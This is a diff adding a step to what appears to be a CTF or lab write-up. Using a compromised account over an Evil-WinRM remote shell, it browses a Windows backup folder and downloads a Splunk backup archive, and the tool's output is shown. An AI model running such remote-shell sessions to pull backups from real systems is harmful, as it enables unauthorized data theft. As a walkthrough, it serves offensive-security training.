@@ -601,4 +601,36 @@ This user is now compromised
 This user is also part of the remote management users group and is also part of the group `backup_reviewers`
 
 
+```python
+*Evil-WinRM* PS C:\> cd Backups
+*Evil-WinRM* PS C:\Backups> dir
+
+
+    Directory: C:\Backups
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/5/2025  12:33 AM                Splunk
+
+
+*Evil-WinRM* PS C:\Backups> cd Splunk
+*Evil-WinRM* PS C:\Backups\Splunk> dir
+
+
+    Directory: C:\Backups\Splunk
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
+
+
+*Evil-WinRM* PS C:\Backups\Splunk> download splunk_backup_2024-08-06.zip
+                                        
+Info: Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip to splunk_backup_2024-08-06.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Backups\Splunk>
+```
 
